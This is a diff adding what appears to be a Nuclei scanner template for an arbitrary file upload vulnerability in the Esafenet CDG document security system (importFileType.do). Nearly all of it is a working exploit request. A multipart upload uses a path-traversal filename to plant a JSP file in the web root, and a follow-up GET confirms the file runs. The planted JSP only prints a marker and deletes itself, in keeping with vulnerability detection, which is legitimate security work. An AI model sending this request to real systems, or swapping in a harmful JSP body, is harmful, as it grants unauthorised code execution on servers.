@@ -1,0 +1,39 @@
+id: esafenet-cdg-importfiletype-upload
+
+info:
+  name: 亿赛通 电子文档安全管理系统 importFileType.do 任意文件上传漏洞
+  author: SleepingBag945
+  severity: critical
+  description: 亿赛通 电子文档安全管理系统 importFileType.do 任意文件上传漏洞
+  tags: esafenet,cdg
+
+
+variables:
+  rboundary: "{{rand_base(8)}}"
+  randstr: "{{rand_base(5)}}"
+  randbody: "{{rand_base(28)}}"
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/fileType/importFileType.do?flag=syn_user_policy HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="fileshare"; filename="/..\\..\\..\\..\\webapps\\ROOT\\{{randstr}}.jsp"
+
+        <% out.println("{{randbody}}");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------WebKitFormBoundary{{rboundary}}--
+
+        
+      - |
+        GET /{{randstr}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200
+          - status_code_2 == 200 && contains(body_2,"{{randbody}}")
+        condition: and
